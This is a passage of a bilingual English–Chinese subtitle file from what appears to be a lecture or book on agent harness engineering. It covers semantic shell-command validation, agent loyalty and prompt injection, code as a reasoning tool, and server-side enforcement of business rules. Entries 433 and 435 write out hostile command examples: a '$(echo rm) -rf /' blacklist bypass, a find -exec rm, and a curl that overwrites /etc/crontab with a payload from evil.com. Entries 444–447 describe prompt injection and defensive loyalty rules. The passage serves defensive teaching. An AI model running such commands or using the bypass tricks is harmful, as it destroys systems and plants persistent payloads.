    "zh": "一个实际细节：超时或配额违规应向智能体返回结构化错误（例如“执行在120秒后终止；最后的输出如下……”），而不是静默地终止进程，这样智能体在下一轮还能有机会调整策略。"
  },
  {
    "id": 430,
    "start": 4001.293,
    "end": 4006.368,
    "en": "Safety: Semantic Parsing over Keyword Blacklists.*",
    "zh": "安全性：基于语义解析而非关键词黑名单。"
  },
  {
    "id": 431,
    "start": 4006.54,
    "end": 4013.177,
    "en": "Chapter 1 argued that the verification layer should rely on semantic understanding rather than pattern matching.",
    "zh": "第一章指出，验证层应依赖语义理解而非模式匹配。"
  },
  {
    "id": 432,
    "start": 4013.127,
    "end": 4018.552,
    "en": "Shell command security validation is the most challenging application of this principle.",
    "zh": "Shell 命令安全验证是这一原则最具挑战性的应用。"
  },
  {
    "id": 433,
    "start": 4018.552,
    "end": 4036.265,
    "en": "Simple keyword blacklists cannot cope with the combinatorial explosion of Shell—commands can bypass any static rules through pipes, subshells, variable expansion, etc. (e.g., if rm is blocked, an attacker can use $(echo rm) -rf / to bypass).",
    "zh": "简单的关键词黑名单无法应对 Shell 的组合爆炸——命令可以通过管道、子 shell、变量展开等方式绕过静态规则（例如，如果 rm 被阻止，攻击者可以使用 $(echo rm) -rf / 来绕过）。"
  },
  {
    "id": 434,
    "start": 4036.265,
    "end": 4052.54,
    "en": "Production-grade Harnesses employ semantic parsing: identifying each command's argument types and parsing rules, including which flags consume following arguments, and recognizing attack patterns such as a seemingly harmless flag that hides a dangerous payload in its next argument.",
    "zh": "生产级的 Harness 采用语义解析：识别每个命令的参数类型和解析规则，包括哪些标志会消耗后续参数，并能识别攻击模式，如看似无害的标志实际上在其下一个参数中隐藏了危险负载。"
  },
  {
    "id": 435,
    "start": 4052.54,
    "end": 4075.215,
    "en": "For example, find / -name '.log' -exec rm {} \\; embeds an rm delete operation through legitimate find command arguments; another example is curl -o /etc/crontab http://evil.com/payload, which appears to download a file but actually overwrites system scheduled tasks.",
    "zh": "例如，find / -name '.log' -exec rm {} \\; 通过合法的 find 命令参数嵌入了 rm 删除操作；另一个例子是 curl -o /etc/crontab http://evil.com/payload，它看起来像是下载文件，但实际上覆盖了系统计划任务。"
  },
  {
    "id": 436,
    "start": 4075.215,
    "end": 4082.702,
    "en": "Semantic parsing can identify these nested dangerous operations, while simple command blacklists cannot capture them.",
    "zh": "语义解析可以识别这些嵌套的危险操作，而简单的命令黑名单无法捕捉它们。"
  },
  {
    "id": 437,
    "start": 4082.702,
    "end": 4089.977,
    "en": "This security mechanism based on understanding rather than matching is a high-level implementation of the \"constraint\" function.",
    "zh": "这种基于理解而非匹配的安全机制是“约束”功能的高级实现。"
  },
  {
    "id": 438,
    "start": 4089.977,
    "end": 4094.815,
    "en": "Whom Does the Agent Serve: Loyalty Under Multi-Party Delegation.",
    "zh": "智能体为谁服务：多方委托下的忠诚度问题。"
  },
  {
    "id": 439,
    "start": 4094.815,
    "end": 4105.752,
    "en": "The security mechanisms above prevent \"commands from being executed maliciously\"; there is a subtler security issue—principal loyalty: whose side is the Agent actually on.",
    "zh": "上述安全机制防止了“命令被恶意执行”；还存在一个更微妙的安全问题——委托人忠诚度：智能体实际上站在哪一方。"
  },
  {
    "id": 440,
    "start": 4105.752,
    "end": 4120.852,
    "en": "Models are trained with a naive default principle—\"whoever is talking to me, I will try my best to help them\"—but real-world Agents often operate under multi-party delegation: acting on behalf of a principal while dealing with third parties whose interests conflict.",
    "zh": "模型的训练遵循一种天真的默认原则——“谁和我对话，我就尽最大努力帮助他们”——但在现实世界中，智能体通常处于多方委托的环境中：代表委托人行事，同时与利益冲突的第三方打交道。"
  },
  {
    "id": 441,
    "start": 4120.852,
    "end": 4127.94,
    "en": "An Agent negotiating a price on your behalf faces not a \"user in need of help\" but a negotiating opponent.",
    "zh": "一个代表你谈判价格的智能体面对的不是“需要帮助的用户”，而是谈判对手。"
  },
  {
    "id": 442,
    "start": 4127.94,
    "end": 4136.077,
    "en": "Here, \"help whoever speaks\" is a dangerous default—the opposing party can begin influencing your Agent simply by engaging it.",
    "zh": "在这里，“帮助任何说话的人”是一个危险的默认设置——对方只需与智能体互动，就能开始影响你的智能体。"
  },
  {
    "id": 443,
    "start": 4136.077,
    "end": 4142.69,
    "en": "Putting frontier models into this situation reveals a clear loyalty spectrum, with both ends failing",
    "zh": "将前沿模型置于这种情况下会揭示出一个清晰的忠诚度谱系，两端都失败了。"
  },
  {
    "id": 444,
    "start": 4142.69,
    "end": 4160.24,
    "en": "This is particularly relevant to Coding Agents: untrusted content read from a repository, output returned by a tool, instructions sent by a third-party MCP server—all are \"opponents\" trying to turn the Agent—prompt injection is essentially an attempt at turning (Chapters 2 and 4).",
    "zh": "这对代码智能体尤其重要：从仓库中读取的不受信任内容、工具返回的输出、第三方MCP服务器发送的指令——这些都是试图操控智能体的“对手”；提示注入本质上就是一种操控尝试（第2章和第4章）。"
  },
  {
    "id": 445,
    "start": 4160.24,
    "end": 4175.09,
    "en": "The Harness must therefore explicitly nail down whom the Agent is loyal to: instructions from the principal carry the highest priority, while everything from external parties is downgraded by default to \"data that may be consulted but carries no force of instruction.",
    "zh": "因此，Harness必须明确界定智能体的忠诚对象：来自委托人的指令具有最高优先级，而来自外部方的所有内容则默认降级为“可参考但不具指令效力的数据”。"
  },
  {
    "id": 446,
    "start": 4175.09,
    "end": 4197.202,
    "en": "In the system prompt, an effective loyalty code of conduct is: protect the principal's private information, including the fact that it exists; when refusing, do not enumerate protected details, because doing so may itself leak them; private bottom lines are not public positions; only execute the principal's clear and specific instructions; withstand repeated pressure.",
    "zh": "在系统提示中，有效的忠诚行为准则是：保护委托人的隐私信息，包括其存在的事实；拒绝时不要列举受保护的细节，因为这样做本身可能会泄露这些信息；私密底线不是公开立场；只执行委托人明确且具体的指令；抵御反复的压力。"
  },
  {
    "id": 447,
    "start": 4197.202,
    "end": 4206.69,
    "en": "Essentially, this is using the Harness to give the model a stance it lacks by default: absolute loyalty to the principal, and caution toward external parties.",
    "zh": "本质上，这是通过Harness赋予模型原本缺乏的立场：对委托人的绝对忠诚，以及对外部方的谨慎态度。"
  },
  {
    "id": 448,
    "start": 4206.69,
    "end": 4210.39,
    "en": "Code: The Meta-Capability of a General Agent.",
    "zh": "代码：通用智能体的元能力。"
  },
  {
    "id": 449,
    "start": 4210.39,
    "end": 4218.202,
    "en": "The previous section showed how to build a reliable Coding Agent—from architecture to tool implementation to harness engineering.",
    "zh": "上一节展示了如何构建一个可靠的代码智能体——从架构到工具实现再到Harness工程。"
  },
  {
    "id": 450,
    "start": 4218.202,
    "end": 4223.14,
    "en": "But the value of code generation extends far beyond writing programs.",
    "zh": "但代码生成的价值远超编写程序本身。"
  },
  {
    "id": 451,
    "start": 4223.308,
    "end": 4225.795,
    "en": "What is a \"meta-capability\"?",
    "zh": "什么是“元能力”？"
  },
  {
    "id": 452,
    "start": 4225.745,
    "end": 4235.07,
    "en": "An ordinary capability is an Agent's ability to do a specific thing—answer a question, call a certain API, generate a piece of text.",
    "zh": "普通能力是指智能体执行特定任务的能力——回答问题、调用某个API、生成一段文本。"
  },
  {
    "id": 453,
    "start": 4235.07,
    "end": 4249.208,
    "en": "A meta-capability is an ability that \"can create other abilities\": the Agent uses it to write new tools, new constraints, and new forms of expression on the fly to accomplish a task, without needing to have all capabilities pre-built.",
    "zh": "元能力是指一种“能够创造其他能力”的能力：智能体使用它实时编写新工具、新约束和新表达形式来完成任务，而无需预先构建所有能力。"
  },
  {
    "id": 454,
    "start": 4249.208,
    "end": 4269.57,
    "en": "Code generation is precisely such a meta-capability—it is precise, executable, and composable, allowing it to produce new tools (scripts, API call sequences), new constraints (assertions, validation rules), and new forms of expression (HTML forms, PPTs, video frames).",
    "zh": "代码生成正是这样一种元能力——它精确、可执行且可组合，能够生成新工具（脚本、API调用序列）、新约束（断言、验证规则）和新表达形式（HTML表单、PPT、视频帧）。"
  },
  {
    "id": 455,
    "start": 4269.57,
    "end": 4275.92,
    "en": "For this reason, the role code plays in an Agent system goes far beyond \"writing programs.",
    "zh": "因此，代码在智能体系统中的作用远超出“编写程序”。"
  },
  {
    "id": 456,
    "start": 4275.92,
    "end": 4283.82,
    "en": "The next six sections demonstrate, one by one, six directions in which this meta-capability applies beyond programming.",
    "zh": "接下来的六个部分逐一展示了这一元能力在编程之外的六个应用方向。"
  },
  {
    "id": 457,
    "start": 4283.82,
    "end": 4292.845,
    "en": "These six directions are not merely a flat list; they progress from the inside out, organized by the object to which the meta-capability is applied:",
    "zh": "这六个方向不仅仅是一份简单的列表；它们从内到外逐步推进，按元能力所作用的对象进行组织："
  },
  {
    "id": 458,
    "start": 4292.845,
    "end": 4299.258,
    "en": "Thinking Itself—using code to replace error-prone natural-language reasoning (Thinking Tools)",
    "zh": "思维本身——用代码替代易出错的自然语言推理（思维工具）"
  },
  {
    "id": 459,
    "start": 4299.258,
    "end": 4306.058,
    "en": "Business Rules—encoding vague policies as executable constraints (Business Rule Constraints)",
    "zh": "业务规则——将模糊的政策编码为可执行的约束（业务规则约束）"
  },
  {
    "id": 460,
    "start": 4306.058,
    "end": 4314.42,
    "en": "Content Presentation—generating PPTs, videos, and visualization artifacts (Multimedia Generation)",
    "zh": "内容展示——生成PPT、视频和可视化成果（多媒体生成）"
  },
  {
    "id": 461,
    "start": 4314.42,
    "end": 4322.845,
    "en": "System Interfaces—bridging heterogeneous APIs and automatically adapting to evolving data formats (System Adapters)",
    "zh": "系统接口——连接异构API并自动适应不断变化的数据格式（系统适配器）"
  },
  {
    "id": 462,
    "start": 4322.845,
    "end": 4329.645,
    "en": "User Interfaces—dynamically constructing forms and interactive interfaces (Generative UI)",
    "zh": "用户界面——动态构建表单和交互界面（生成式用户界面）"
  },
  {
    "id": 463,
    "start": 4329.645,
    "end": 4336.445,
    "en": "The Agent Itself—using code to create or repair new Agents, thereby enabling bootstrapping.",
    "zh": "智能体自身——用代码创建或修复新的智能体，从而实现自举。"
  },
  {
    "id": 464,
    "start": 4336.445,
    "end": 4338.783,
    "en": "Code as a Thinking Tool.",
    "zh": "代码作为思维工具。"
  },
  {
    "id": 465,
    "start": 4338.783,
    "end": 4349.67,
    "en": "LLMs are remarkable at understanding and generating natural language, yet fundamentally weak at precise calculation, symbolic manipulation, and strict logical deduction.",
    "zh": "大语言模型在理解和生成自然语言方面表现出色，但在精确计算、符号操作和严格逻辑推导方面却本质上较弱。"
  },
  {
    "id": 466,
    "start": 4349.67,
    "end": 4359.558,
    "en": "The reason: a model's thinking is inherently probabilistic and approximate, while mathematical and logical problems demand deterministic, exact answers.",
    "zh": "原因在于：模型的思考本质上是概率性的和近似的，而数学和逻辑问题需要确定性的、精确的答案。"
  },
  {
    "id": 467,
    "start": 4359.558,
    "end": 4362.77,
    "en": "One concrete comparison makes the point:",
    "zh": "一个具体的对比就能说明问题："
  },
  {
    "id": 468,
    "start": 4362.77,
    "end": 4367.508,
    "en": "Refer to the companion repository for the complete code implementation.",
    "zh": "请参考配套仓库中的完整代码实现。"
  },
  {
    "id": 469,
    "start": 4367.508,
    "end": 4379.195,
    "en": "Let the LLM be responsible for understanding the problem and writing the code, and let the code interpreter be responsible for precise calculation—this division of labor lets each play to its strengths.",
    "zh": "让大语言模型负责理解问题并编写代码，让代码解释器负责精确计算——这种分工让各自发挥优势。"
  },
  {
    "id": 470,
    "start": 4379.195,
    "end": 4384.92,
    "en": "Stephen Wolfram, the creator of Mathematica, offered a profound insight on this.",
    "zh": "斯蒂芬·沃尔弗拉姆（Mathematica 的创造者）对此有深刻的见解。"
  },
  {
    "id": 471,
    "start": 4384.92,
    "end": 4399.345,
    "en": "Before LLMs existed, there were already systems capable of precise mathematical computation—they worked using Symbolic Computation, i.e., processing expressions using mathematical symbols rather than approximate numerical values.",
    "zh": "在大语言模型出现之前，已经存在能够进行精确数学计算的系统——它们通过符号计算工作，即使用数学符号处理表达式，而不是近似数值。"
  },
  {
    "id": 472,
    "start": 4399.345,
    "end": 4415.058,
    "en": "For example, a conventional calculator would approximate \\sqrt{2} as 1.414, whereas a symbolic computation system would preserve the exact form \\sqrt{2}, only converting to a decimal when necessary.",
    "zh": "例如，传统计算器会将√2近似为1.414，而符号计算系统则会保留精确形式√2，仅在必要时转换为十进制数。"
  },
  {
    "id": 473,
    "start": 4415.058,
    "end": 4423.195,
    "en": "Wolfram Alpha, created by Wolfram, is such a system: users input a math problem, and it returns an exact answer.",
    "zh": "由沃尔弗拉姆开发的Wolfram Alpha就是这样的系统：用户输入数学问题，它会返回精确答案。"
  },
  {
    "id": 474,
    "start": 4423.195,
    "end": 4440.133,
    "en": "However, its natural language understanding is quite fragile and its coverage is narrow—it relies on a built-in grammar parser that can only recognize a limited set of phrasings; a slight change in phrasing could cause parsing to fail, and it certainly cannot handle open-domain multi-step reasoning.",
    "zh": "然而，它的自然语言理解非常脆弱，覆盖范围也很窄——它依赖于内置的语法解析器，只能识别有限的表达方式；稍有变化的表达方式就可能导致解析失败，更不用说处理开放领域的多步骤推理了。"
  },
  {
    "id": 475,
    "start": 4440.133,
    "end": 4448.745,
    "en": "LLMs perfectly fill this gap—they excel at understanding various natural language expressions but are not good at precise calculation.",
    "zh": "大语言模型恰好弥补了这一空白——它们擅长理解各种自然语言表达，但在精确计算方面并不擅长。"
  },
  {
    "id": 476,
    "start": 4448.745,
    "end": 4472.208,
    "en": "The new collaborative model is: let the LLM be responsible for understanding the user's natural language question, identifying the mathematical or logical structure within it, and translating it into a formal language (such as the Mathematica language or Python's SymPy library); then hand it over to a dedicated symbolic computation engine or constraint solver for execution to obtain precise results.",
    "zh": "新的协作模式是：让大语言模型负责理解用户的自然语言问题，识别其中的数学或逻辑结构，并将其转化为形式语言（如Mathematica语言或Python的SymPy库）；然后将其交给专用的符号计算引擎或约束求解器进行执行，以获得精确结果。"
  },
  {
    "id": 477,
    "start": 4472.356,
    "end": 4481.468,
    "en": "Experiment 5-3 intermediate difficulty, two stars: : Using Code Generation Tools to Improve Mathematical Problem-Solving Ability",
    "zh": "实验5-3 中等难度，两颗星：利用代码生成工具提升数学解题能力"
  },
  {
    "id": 478,
    "start": 4481.418,
    "end": 4488.968,
    "en": "Experiment Goal: Verify the accuracy improvement of an Agent's mathematical thinking when assisted by a Code Interpreter.",
    "zh": "实验目标：验证智能体在代码解释器协助下数学思维准确性的提升。"
  },
  {
    "id": 479,
    "start": 4488.968,
    "end": 4497.743,
    "en": "Technical Approach: Equip the Agent with a Python sandbox containing mathematical libraries like sympy, numpy, and scipy.",
    "zh": "技术方法：为智能体配备包含数学库（如sympy、numpy和scipy）的Python沙盒环境。"
  },
  {
    "id": 480,
    "start": 4497.743,
    "end": 4511.818,
    "en": "When the Agent encounters a math problem, it formalizes it into Python code: sympy for symbolic computation (calculus, equation solving), scipy for numerical optimization, numpy for matrix operations.",
    "zh": "当智能体遇到数学问题时，它会将其形式化为Python代码：sympy用于符号计算（微积分、方程求解），scipy用于数值优化，numpy用于矩阵运算。"
  },
  {
    "id": 481,
    "start": 4511.818,
    "end": 4517.006,
    "en": "The generated code is executed in the sandbox to return precise results.",
    "zh": "生成的代码在沙盒中执行以返回精确结果。"
  },
  {
    "id": 482,
    "start": 4517.006,
    "end": 4525.581,
    "en": "Acceptance Criteria: Evaluate using AIME-style problems (modeled after the American Invitational Mathematics Examination).",
    "zh": "验收标准：使用AIME风格的问题进行评估（以美国邀请数学考试为模板）。"
  },
  {
    "id": 483,
    "start": 4525.581,
    "end": 4534.643,
    "en": "Compare the accuracy of pure chain-of-thought reasoning with that of code-assisted reasoning; the code-assisted mode should achieve significantly higher accuracy.",
    "zh": "比较纯思维链推理与代码辅助推理的准确性；代码辅助模式应显著提高准确性。"
  },
  {
    "id": 484,
    "start": 4534.643,
    "end": 4541.506,
    "en": "Check whether the code correctly uses the mathematical libraries and whether the solution process is logically clear.",
    "zh": "检查代码是否正确使用数学库以及解题过程是否逻辑清晰。"
  },
  {
    "id": 485,
    "start": 4541.506,
    "end": 4550.006,
    "en": "Experiment 5-4 intermediate difficulty, two stars: : Using Code Generation Tools to Improve Logical Reasoning Ability",
    "zh": "实验5-4 中等难度，两颗星：使用代码生成工具提升逻辑推理能力"
  },
  {
    "id": 486,
    "start": 4550.006,
    "end": 4556.918,
    "en": "Experiment Goal: Assess the Agent's ability to perform logical reasoning with the help of constraint-solving code.",
    "zh": "实验目标：评估智能体在约束求解代码帮助下进行逻辑推理的能力。"
  },
  {
    "id": 487,
    "start": 4556.918,
    "end": 4563.318,
    "en": "Technical Approach: Equip the Agent with a Code Interpreter containing the python-constraint library.",
    "zh": "技术方法：为智能体配备包含python-constraint库的代码解释器。"
  },
  {
    "id": 488,
    "start": 4563.318,
    "end": 4580.231,
    "en": "The Agent translates logic puzzles, such as Knights and Knaves problems, into formal constraint models: it identifies the variables (each islander's identity), encodes rules such as \"knights tell the truth\" as constraints, and invokes the solver to find a satisfying assignment.",
    "zh": "智能体将逻辑谜题（如骑士与骗子问题）转化为形式化约束模型：它识别变量（每位岛民的身份），将规则如“骑士说真话”编码为约束，并调用求解器找到满足的赋值。"
  },
  {
    "id": 489,
    "start": 4580.231,
    "end": 4585.406,
    "en": "Acceptance Criteria: Evaluate using the K&K Puzzle dataset.",
    "zh": "验收标准：使用K&K谜题数据集进行评估。"
  },
  {
    "id": 490,
    "start": 4585.406,
    "end": 4593.906,
    "en": "The code-assisted mode should achieve a solution accuracy of over 90%, significantly higher than when reasoning without code assistance.",
    "zh": "代码辅助模式应达到超过90%的解题准确率，明显高于无代码辅助时的准确率。"
  },
  {
    "id": 491,
    "start": 4593.906,
    "end": 4600.106,
    "en": "This experiment also reveals a more general pattern: model and harness trade off against each other.",
    "zh": "本次实验还揭示了一个更普遍的规律：模型和工具之间存在权衡。"
  },
  {
    "id": 492,
    "start": 4600.106,
    "end": 4608.668,
    "en": "When the model is strong enough, the harness can be thinner—the model reasons correctly on its own, and the gain from a code solver narrows.",
    "zh": "当模型足够强大时，工具可以更薄——模型能独立正确推理，代码求解器带来的增益变小。"
  },
  {
    "id": 493,
    "start": 4608.668,
    "end": 4617.218,
    "en": "When the model is weaker, the harness must do more—offloading the key logical reasoning to code and constraint solvers to guarantee correctness.",
    "zh": "当模型较弱时，工具必须承担更多工作——将关键的逻辑推理任务转移给代码和约束求解器以保证正确性。"
  },
  {
    "id": 494,
    "start": 4617.218,
    "end": 4638.606,
    "en": "That is why this experiment deliberately uses a weaker model, to amplify the contrast: a weaker model frequently makes calculation errors when reasoning without code assistance, and code assistance lifts accuracy dramatically; a sufficiently strong reasoning model often solves every puzzle without code assistance, and the gain from code assistance converges to near zero.",
    "zh": "这就是为什么本次实验特意使用了较弱的模型，以放大对比：较弱的模型在没有代码辅助的情况下经常出现计算错误，而代码辅助能大幅提升准确率；一个足够强大的推理模型通常能在没有代码辅助的情况下解决所有谜题，而代码辅助带来的增益趋近于零。"
  },
  {
    "id": 495,
    "start": 4638.606,
    "end": 4653.643,
    "en": "How thick the harness should be, then, depends on where your model's capability boundary lies—a premise easily overlooked when evaluating any Agent technique: the same harness, paired with models of different strength, can support opposite conclusions.",
    "zh": "因此，工具应该有多厚，取决于你的模型能力边界——这是在评估任何智能体技术时容易被忽视的前提：相同的工具，搭配不同强度的模型，可能得出相反的结论。"
  },
  {
    "id": 496,
    "start": 4653.643,
    "end": 4656.793,
    "en": "Code as a Constraint for Business Rules.",
    "zh": "代码作为业务规则的约束条件。"
  },
  {
    "id": 497,
    "start": 4656.793,
    "end": 4662.231,
    "en": "This section is a direct response to the Harness Engineering section earlier in this chapter.",
    "zh": "本节是对本章前面“Harness工程”部分的直接回应。"
  },
  {
    "id": 498,
    "start": 4662.231,
    "end": 4677.206,
    "en": "One of the core principles of the Harness is \"Constraints: Encoded, Not Documented\"—transforming rules from natural language documentation into executable code, making them mandatory constraints on system behavior rather than advisory guidelines.",
    "zh": "Harness的核心原则之一是“约束：编码而非文档化”——将自然语言文档中的规则转化为可执行代码，使其成为对系统行为的强制性约束，而不是建议性指导。"
  },
  {
    "id": 499,
    "start": 4677.206,
    "end": 4682.943,
    "en": "Code generation enables the Agent to autonomously complete this transformation process.",
    "zh": "代码生成使智能体能够自主完成这一转换过程。"
  },
  {
    "id": 500,
    "start": 4682.943,
    "end": 4690.181,
    "en": "Business rules, workflows, and decision logic described only in natural language are riddled with ambiguity.",
    "zh": "仅以自然语言描述的业务规则、工作流程和决策逻辑充满了歧义。"
  },
  {
    "id": 501,
    "start": 4690.181,
    "end": 4693.243,
    "en": "What is a \"reasonable refund request\"?",
    "zh": "什么是“合理的退款请求”？"
  },
  {
    "id": 502,
    "start": 4693.243,
    "end": 4695.918,
    "en": "What counts as an \"emergency\"?",
    "zh": "什么算作“紧急情况”？"
  },
  {
    "id": 503,
    "start": 4695.918,
    "end": 4705.393,
    "en": "The boundaries resist natural-language definition—\"refundable within 7 days of purchase\" sounds clear, but are those calendar days or business days?",
    "zh": "这些边界难以用自然语言定义——“购买后7天内可退款”听起来清晰，但指的是日历天还是工作日？"
  },
  {
    "id": 504,
    "start": 4705.393,
    "end": 4708.956,
    "en": "Does \"purchase\" mean order placement or shipment?",
    "zh": "“购买”是指下单还是发货？"
  },
  {
    "id": 505,
    "start": 4708.956,
    "end": 4718.443,
    "en": "Code, by contrast, is an unambiguous, executable representation of knowledge—it either runs or throws an error; there is no in-between.",
    "zh": "相比之下，代码是对知识的无歧义、可执行的表示——它要么运行，要么抛出错误；没有中间状态。"
  },
  {
    "id": 506,
    "start": 4718.443,
    "end": 4722.018,
    "en": "Precisely Expressing Complex Business Rules.",
    "zh": "精确表达复杂的业务规则。"
  },
  {
    "id": 507,
    "start": 4722.018,
    "end": 4727.993,
    "en": "Natural Language Rules vs. Codified Rules: Complementary, Not Interchangeable",
    "zh": "自然语言规则与编码规则：互补而非可互换"
  },
  {
    "id": 508,
    "start": 4728.148,
    "end": 4741.76,
    "en": "Writing rules in the system prompt allows the model to explain policies to users, identify policy-compliant alternatives (e.g., \"rebook instead of cancel\"), and make a preliminary feasibility judgment before calling a tool.",
    "zh": "在系统提示中编写规则可以让模型向用户解释政策，识别符合政策的替代方案（例如，“重新预订而非取消”），并在调用工具前进行初步可行性判断。"
  },
  {
    "id": 509,
    "start": 4741.71,
    "end": 4762.76,
    "en": "Codifying rules as validation tools offers three advantages: precise, unambiguous decision logic; deterministic execution, so the same input always produces the same output; and effective handling of complex rule combinations, such as multi-condition Boolean logic, time calculations, and cross-data-source validation.",
    "zh": "将规则编码为验证工具有三个优势：精确且无歧义的决策逻辑；确定性执行，即相同输入总是产生相同输出；以及有效处理复杂规则组合，如多条件布尔逻辑、时间计算和跨数据源验证。"
  },
  {
    "id": 510,
    "start": 4762.76,
    "end": 4776.985,
    "en": "In practice, they should be used together: the system prompt contains natural language rules for understanding and communication, while key decision points are equipped with codified validation tools acting as \"gatekeepers\" to ensure compliance.",
    "zh": "实际上，它们应结合使用：系统提示包含用于理解和沟通的自然语言规则，而关键决策点则配备编码的验证工具作为“守门人”，以确保合规性。"
  },
  {
    "id": 511,
    "start": 4776.985,
    "end": 4783.16,
    "en": "The true value of codified rules is not token efficiency but preventing irreversible mistakes.",
    "zh": "编码规则的真正价值不在于令牌效率，而在于防止不可逆的错误。"
  },
  {
    "id": 512,
    "start": 4783.16,
    "end": 4789.948,
    "en": "Canceling an order, transferring funds, or deleting data may be impossible to undo once executed.",
    "zh": "取消订单、转账或删除数据一旦执行，可能无法撤销。"
  },
  {
    "id": 513,
    "start": 4789.948,
    "end": 4798.823,
    "en": "Codified validation places a last line of defense in front of the operation, and the value of that guarantee far outweighs its implementation cost.",
    "zh": "编码验证在操作前设置了一道最后防线，这种保障的价值远超过其实施成本。"
  },
  {
    "id": 514,
    "start": 4798.823,
    "end": 4805.823,
    "en": "Combining Validation with Execution: Checklists Guide Reasoning; Ground-Truth Validation Guards the Gate",
    "zh": "验证与执行的结合：检查清单引导推理；真实验证守护入口"
  },
  {
    "id": 515,
    "start": 4805.823,
    "end": 4811.96,
    "en": "Instead of building a separate validation tool, put the validation inside the execution tool.",
    "zh": "与其构建单独的验证工具，不如将验证放入执行工具中。"
  },
  {
    "id": 516,
    "start": 4811.96,
    "end": 4823.36,
    "en": "Consider the airline cancellation policy from τ-bench, a benchmark designed to evaluate tool use and policy compliance in simulated airline and e-commerce customer-service scenarios:",
    "zh": "考虑τ-bench中的航空公司取消政策，这是一个用于评估工具使用和政策合规性的基准，适用于模拟的航空和电子商务客户服务场景："
  },
  {
    "id": 517,
    "start": 4823.36,
    "end": 4832.86,
    "en": "Here is the structured JSON representation exchanged with the API, defining the model parameters, conversation history, and tool definitions.",
    "zh": "这是与API交换的结构化JSON表示，定义了模型参数、对话历史和工具定义。"
  },
  {
    "id": 518,
    "start": 4832.86,
    "end": 4836.898,
    "en": "The value of this design should be understood on two levels.",
    "zh": "这种设计的价值应从两个层面来理解。"
  },
  {
    "id": 519,
    "start": 4836.898,
    "end": 4840.835,
    "en": "First level: parameters as a thinking checklist.",
    "zh": "第一层：参数作为思考检查清单。"
  },
  {
    "id": 520,
    "start": 4840.835,
    "end": 4856.148,
    "en": "The tool description lists the complete cancellation policy and requires the model to \"query order details and check each condition one by one before calling\"; the optional expected_ parameters further prompt the model to explicitly write out its own reasoning.",
    "zh": "工具描述列出了完整的取消政策，并要求模型在调用前“查询订单详情并逐一检查每个条件”；可选的expected_参数进一步提示模型明确写出自己的推理过程。"
  },
  {
    "id": 521,
    "start": 4856.148,
    "end": 4868.123,
    "en": "To fill in these parameters, the model must first call the query tool to get order details and verify each condition one by one — filling in these parameters therefore acts as a mandatory checklist.",
    "zh": "要填写这些参数，模型必须首先调用查询工具获取订单详情并逐一验证每个条件——因此填写这些参数起到了强制性检查清单的作用。"
  },
  {
    "id": 522,
    "start": 4868.123,
    "end": 4882.898,
    "en": "When the model finds that the cabin class is economy and insurance has not been purchased, it may notice Rule 5 while preparing the call and therefore avoid initiating it, instead directly telling the user \"Economy class without insurance cannot be cancelled.",
    "zh": "当模型发现舱位等级为经济舱且未购买保险时，在准备调用时可能会注意到第5条规则，从而避免发起调用，而是直接告诉用户：“经济舱未购买保险无法取消。”"
  },
  {
    "id": 523,
    "start": 4882.898,
    "end": 4887.36,
    "en": "Consider purchasing insurance before cancelling or changing your booking.",
    "zh": "请在取消或更改预订前考虑购买保险。"
  },
  {
    "id": 524,
    "start": 4887.36,
    "end": 4893.96,
    "en": "This layer guides reasoning and reduces invalid calls; however, it is not a security boundary.",
    "zh": "这一层引导推理并减少无效调用；然而，它并不是安全边界。"
  },
  {
    "id": 525,
    "start": 4893.96,
    "end": 4900.398,
    "en": "The expected_ values are only self-reported claims, never facts trusted by the server.",
    "zh": "expected_值只是自我报告的声明，服务器从不将其视为事实信任。"
  },
  {
    "id": 526,
    "start": 4900.398,
    "end": 4905.36,
    "en": "Second level: server-side ground-truth validation as the gatekeeper.",
    "zh": "第二层：服务器端的真值验证作为守门人。"
  },
  {
    "id": 527,
    "start": 4905.36,
    "end": 4918.348,
    "en": "Note the key design in the code: cabin class, insurance status, booking time, segment usage, and flight status are all queried from the database by the server; the current time comes from the server clock.",
    "zh": "注意代码中的关键设计：舱位等级、保险状态、预订时间、航段使用情况和航班状态均由服务器从数据库中查询；当前时间来自服务器时钟。"
  },
  {
    "id": 528,
    "start": 4918.348,
    "end": 4922.86,
    "en": "No policy fact comes from the model's self-reported parameters.",
    "zh": "没有任何政策事实来自模型自我报告的参数。"
  },
  {
    "id": 529,
    "start": 4922.86,
    "end": 4937.435,
    "en": "This is not needless redundancy: the model may hallucinate or be manipulated by prompt injection, and—as the earlier Lethal Triad analysis showed—an Agent operating within a single context cannot reliably validate its own behavior.",
    "zh": "这不是多余的冗余：模型可能会产生幻觉或受到提示注入的操控，正如前面的致命三元组分析所显示的那样，仅在一个上下文中运行的智能体无法可靠地验证其自身行为。"
  },
  {
    "id": 530,
    "start": 4937.435,
    "end": 4950.735,
    "en": "If cabin_class, has_insurance, and even current_time were designed as parameters filled in by the model, a single false value—whether accidental or induced—could bypass the gatekeeper.",
    "zh": "如果舱位等级、是否有保险，甚至当前时间被设计为由模型填写的参数，一个错误的值——无论是意外还是被诱导的——都可能绕过守门人。"
  },
  {
    "id": 531,
    "start": 4950.735,
    "end": 4966.148,
    "en": "The last line of defense must be built on data that the model cannot forge — this is consistent with the earlier stance that \"critical operations require independent verification\": independence refers not only to an independent model but also to an independent data source.",
    "zh": "最后一道防线必须建立在模型无法伪造的数据基础上——这与之前提出的“关键操作需要独立验证”的立场一致：独立性不仅指独立的模型，也指独立的数据源。"
  },
  {
    "id": 532,
    "start": 4966.3,
    "end": 4987.9,
    "en": "The three-tier safeguard is thus complete: (1) natural language rules in the system prompt aid understanding and explanation; (2) tool descriptions and parameter design serve as a checklist, guiding the model to explicitly verify conditions before calling; (3) server-side code-based validation using database ground truth acts as the final gatekeeper.",
    "zh": "因此三层保障机制就完成了：(1) 系统提示中的自然语言规则有助于理解和解释；(2) 工具描述和参数设计作为检查清单，引导模型在调用前显式验证条件；(3) 基于服务器端代码的验证，利用数据库真值作为最终守门人。"
  },
  {
    "id": 533,
    "start": 4987.85,
    "end": 4995.25,
    "en": "The first two tiers reduce the occurrence of errors, and the third ensures that errors do not become irreversible losses.",
    "zh": "前两层减少了错误的发生，第三层确保错误不会造成不可逆的损失。"
  },
  {
    "id": 534,
    "start": 4995.25,
    "end": 5004.35,
    "en": "Experiment 5-5 intermediate difficulty, two stars: : Small models improve rule execution accuracy through code-based knowledge",
    "zh": "实验5-5 中等难度，两颗星：小模型通过基于代码的知识提升规则执行准确性"
  },
  {
    "id": 535,
    "start": 5004.35,
    "end": 5017.037,
